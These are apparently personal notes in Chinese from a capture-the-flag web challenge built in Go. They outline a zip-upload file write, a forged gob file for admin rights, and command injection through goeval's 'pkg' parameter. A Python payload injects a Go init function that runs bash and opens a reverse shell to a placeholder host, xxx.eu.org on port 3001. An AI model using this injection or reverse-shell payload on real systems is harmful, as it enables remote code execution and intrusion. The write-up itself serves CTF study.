tags:: [[CTFWEB/Zip]], [[CTFWEB/Golang]]

- # 思路
	- 上传并解压zip文件可以实现任意文件写入
	- 写入gob文件可以获取admin权限
	- 获取admin权限可以利用注入进行RCE
- # 命令注入
	- 相关代码
		- ```go
		  eval, err := goeval.Eval(
		    "", 
		    "fmt.Println(\"Good\")", 
		    c.DefaultQuery("pkg", "fmt")
		  )
		  ```
	- 查看函数实现可知此处使用^^拼接生成`.go`文件并执行^^的方法实现eval，且第三个参数会拼接到eval处
	- 我们可以通过import其他package并注入一个`init`函数实现RCE
	- payload
		- ```python
		  r = base_get(f"{url}/backdoor", params = {
		      "pkg": "\"os/exec\"\n fmt\"\n)\n\nfunc\tinit(){\ncmd:=exec.Command(CMD)\nout,_:=cmd.CombinedOutput()\nfmt.Println(string(out))\n}\n\n\nvar(a=\"1".replace(
		          "CMD",
		          '"bash","-c","{}"'.format(
		              generate_reverse_shell_payload("xxx.eu.org", 3001)
		          )
		      )
		  })
		  print(r.text)
		  ```